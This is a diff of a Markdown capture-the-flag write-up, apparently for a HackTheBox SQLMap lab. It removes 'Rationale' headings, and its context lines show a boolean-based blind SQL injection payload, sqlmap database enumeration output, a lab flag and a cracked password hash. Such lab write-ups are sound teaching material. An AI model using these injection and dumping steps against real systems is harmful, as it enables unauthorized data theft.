@@ -32,7 +32,6 @@ Type: Boolean-based blind
 Payload: id=1 AND 1=1
 ```
 
-#### **Rationale:**
 Confirming the SQLi vulnerability and understanding the database backend (MySQL) provides the foundation for further exploitation. The type of injection dictates the methods and payloads used for enumeration.
 
 ---
@@ -60,7 +59,6 @@ current database: 'testdb'
 current user is DBA: True
 ```
 
-#### **Rationale:**
 This step establishes context, such as admin privileges (`root` user), which can expand the scope of exploitation. The database version (`5.1.41`) might reveal potential version-specific vulnerabilities.
 
 ---
@@ -87,7 +85,6 @@ Database: testdb
 +--------+
 ```
 
-#### **Rationale:**
 Identifying the `flag1` table enables targeted extraction of data.
 
 ---
@@ -118,7 +115,6 @@ Table: flag1
 +----+----------------------------------------------+
 ```
 
-#### **Rationale:**
 Extracting table contents confirms successful exploitation and retrieves the flag: `HTB{c0ngr4t5_y0u_und3rst00d_SQLMap_basics!}`.
 
 ---
@@ -150,7 +146,6 @@ Table: log
 +--------+--------------+
 ```
 
-#### **Rationale:**
 Schema exploration reveals table structures and potential data storage locations, assisting in identifying high-value targets.
 
 ---
@@ -176,7 +171,6 @@ Table: ROUTINES
 +-----------------+------------+
 ```
 
-#### **Rationale:**
 Searching for keywords like "style" helps locate relevant columns quickly, improving efficiency during enumeration.
 
 ---
@@ -196,7 +190,6 @@ Recognized possible password hashes in column 'password'
 Retrieved password 'Enizoom1609' for hash 'd642ff0feca378666a8727947482f1a4702deba0'
 ```
 
-#### **Rationale:**
 Retrieval of hashes highlights weak password policies, demonstrating how attackers can exploit such vulnerabilities.
 
 ---
